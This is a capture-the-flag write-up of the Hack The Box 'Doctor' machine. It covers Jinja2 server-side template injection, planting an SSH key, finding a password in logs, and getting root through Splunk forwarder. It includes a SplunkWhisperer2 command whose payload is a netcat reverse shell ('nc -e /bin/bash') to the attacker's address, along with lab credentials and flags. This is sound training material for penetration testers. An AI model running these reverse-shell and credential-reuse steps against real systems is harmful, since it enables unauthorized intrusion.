---
layout: post
author: Siddhant Chouhan
title: Hack The Box Doctor Writeup
categories: [HackTheBox,Linux Machines]
tags: [hackthebox, ctf, SSTI,flask,jinja2, creds, users, ssh, splunk, password-reuse]
image: /assets/img/Posts/doctor.png
---
## Overview:

The box starts with us finding a <code class="language-plaintext highlighter-rouge">python flask jinja 2</code> webapp on port 80 and we have <code class="language-plaintext highlighter-rouge">splunk</code> running on port 8089 , We perform a <code class="language-plaintext highlighter-rouge">Server-Side Template Injection</code> to get remote code execution. Then drop our public ssh key and get a shell on the box as the user web. Turns out the user web is part of the adm group which means we can read log files. We find a password in one of the log files and get a shell as the user shaun. We exploit Splunk Forwarder remotely using <code class="language-plaintext highlighter-rouge">SplunkWhisperer2</code> with shaun's credentials and we root the box.

## Reconnaissance
### Nmap Scan
```sql

Nmap 7.80 scan initiated Sun Sep 27 13:31:18 2020 as: nmap -sC -sV -oN nmap_scan -v -Pn 10.10.10.209

Nmap scan report for 10.10.10.209
Host is up (0.16s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Doctor
8089/tcp open  ssl/http Splunkd httpd
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Splunkd
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-09-06T15:57:27
| Not valid after:  2023-09-06T15:57:27
| MD5:   db23 4e5c 546d 8895 0f5f 8f42 5e90 6787
|_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 27 13:32:15 2020 -- 1 IP address (1 host up) scanned in 57.29 seconds
```
### Port 80
<p class= "aligncenter" >
  <img src="/assets/img/Posts/Doctor/doctor-port80.png" class="center">
</p>
Adding doctors.htb to /etc/hosts file.

```shell
┌─[sid@parrot]─[~/Documents/flags/hackthebox/linux-machines/doctor]
└──╼ $sudo vi /etc/hosts

1 127.0.0.1>  localhost$
2 127.0.1.1>  parrot$
3 10.10.10.209 doctors.htb$
4 # The following lines are desirable for IPv6 capable hosts$
5 ::1     localhost ip6-localhost ip6-loopback
6 ff02::1 ip6-allnodes$
7 ff02::2 ip6-allrouters
```

  <img src="/assets/img/Posts/Doctor/virtualhost-80.png" class="center">
  The virtual host reveals a "Doctor Secure Messaging" page and wappalyzer tells us that python flask is the technology being used
</p>
### Port 8089
<p class= "aligncenter" >
  
  <img src="/assets/img/Posts/Doctor/doctor-8089.png" class="center">
</p>
Looks like we have Splunk running on port 8089, Splunk is a data analysis tool and it can be used for analyzing log.s<br>
> Splunk is centralized logs analysis tool for machine generated data, unstructured/structured and complex multi-line data which provides the following features such as Easy Search/Navigate, Real-Time Visibility, Historical Analytics, Reports, Alerts, Dashboards and Visualization.

On clicking services we get a http basic authentication prompt trying default credentials like admin:admin, admin:password etc. doesn't work, moving on to enumerate port 80 further.

### Fiddling around with Doctor Secure Messaging

First I will register a new account. Then I will head over to the new post page.

<img src="/assets/img/Posts/Doctor/signup-80.png" class="center">


  <img src="/assets/img/Posts/Doctor/newpost-80.png" class="center">

Checking out the source code by pressing "Ctrl + U" reveals that there is a /archive which is currently under beta testing.
  
  <img src="/assets/img/Posts/Doctor/source-newpost-80.png" class="center">

On visiting http://doctors.htb we get a blank page but on viewing the source code we find that it has some xml data.

<img src="/assets/img/Posts/Doctor/initial-archive-80.png" class="center">

I will come back to this later.

  <img src="/assets/img/Posts/Doctor/checkingout-newpost.png" class="center">

  <img src="/assets/img/Posts/Doctor/template-look.png" class="center">

  This looks like a blog where the server would just change the username, title and the content. Templates allow easy code reuse only changing the the required fields which can be fetched from the server.

### Server Side Template Injection (SSTI)
  <img src="/assets/img/Posts/Doctor/googling-template-injection.png" class="center">

On googling about template injection in python flask we find that a framework called jinja2 which is used with flask is vulnerable to a technique called Server-Side Template Injection.

> Server-Side Template Injection is possible when an attacker injects template directive as user input that can execute arbitrary code on the server.

Create a new post and inject \{\{ 7*7 }} if we are able to inject code then this payload should get evaluated.


  <img src="/assets/img/Posts/Doctor/testing-ssti.png" class="center">

  <img src="/assets/img/Posts/Doctor/where-did-it-reflect.png" class="center">

Now the thing is if SSTI did happen where did it reflect? On checking out /archive now we find that the Server Side Template Injection reflected there.


  <img src="/assets/img/Posts/Doctor/ssti-reflected-archive.png" class="center">

  Great we did the injection successfully now we have to find out how can we turn this injection into Remote Code Execution.

  [https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
  
  
  <img src="/assets/img/Posts/Doctor/rce-payload.png" class="center">

  <img src="/assets/img/Posts/Doctor/rce-test.png" class="center">

  <img src="/assets/img/Posts/Doctor/archive-home.png" class="center">


  I will drop my public ssh key (id_rsa.pub) in the web user's home directory i.e. /home/web/.ssh/authrized_keys.


  <img src="/assets/img/Posts/Doctor/mkdir-ssh.png" class="center">
 
 <img src="/assets/img/Posts/Doctor/dropping-public-key.png" class="center">

  ```shell
┌─[sid@parrot]─[~/Documents/flags/hackthebox/linux-machines/doctor]
└──╼ $ssh web@doctors.htb 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


76 updates can be installed immediately.
36 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Your Hardware Enablement Stack (HWE) is supported until April 2025.
Last login: Mon Jul 27 20:45:33 2020 from 192.168.127.142
web@doctor:~$ id
uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
web@doctor:~$ 
  ```

The user web is part of the adm group which means we can read log files which are located in /var/log

  <img src="/assets/img/Posts/Doctor/adm-group.png" class="center">

```shell
web@doctor:/var/log$ find . -type f  -exec strings {} \; |grep -i password 2>/dev/null
<SNIP>
Feb  4 01:11:03 doctor kernel: [    5.921194] systemd[1]: Started Forward Password Requests to Plymouth Directory Watch.               
strings: ./vmware-network.1.log: Permission denied                                                                                     
10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"          
strings: ./vmware-network.5.log: Permission denied                                                                                     
strings: ./vmware-network.6.log: Permission denied                                                                                     
<SNIP>
```
We found a password "Guitar123" let's use this password for the user shaun.

```shell
web@doctor:/var/log$ su shaun
Password: 
shaun@doctor:/var/log$ id
uid=1002(shaun) gid=1002(shaun) groups=1002(shaun)
shaun@doctor:/var/log$ 
shaun@doctor:/var/log$ cd /home/shaun
shaun@doctor:~$ ls
user.txt
shaun@doctor:~$ cat user.txt
63918588bf664df1ff018a0dd5d9d436
shaun@doctor:~$ 
```
## Privilege Escalation

Not able to find any privilege escalation vectors, we can try logging in the splunk web app on port 8089 with the credentials
shaun:Guitar123

We are able to login, but now we have to find how can we do privilege escalation via splunk.

On googling splunk privilege escalation, we get the following exploit.
[https://github.com/cnotin/SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2)

```shell
┌─[sid@parrot]─[~/Documents/flags/hackthebox/linux-machines/doctor/SplunkWhisperer2/PySplunkWhisperer2]                         
└──╼ $python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.25 --lport 2222 --username shaun --password Guitar123 --payload 'nc.traditional -e /bin/bash 10.10.14.25 4444'
```


```shell
┌─[sid@parrot]─[~/Documents/flags/hackthebox/linux-machines/doctor/SplunkWhisperer2/PySplunkWhisperer2]+++++++++++++++++++++++++$
└──╼ nc -lp 4444

python3 -c 'import pty;pty.spawn("/bin/bash")'
root@doctor:/# id
uid=0(root) gid=0(root) groups=0(root)
root@doctor:/#
root@doctor:/# cd /root
cd /root
root@doctor:/root#
root@doctor:/root# ls
ls
root.txt
root@doctor:/root# cat root.txt
cat root.txt
bee050ee1540e4ba11809239374681b4
root@doctor:/root# 
```

And that was the box, if you have any doubts feel free to reach out to me on my social media.
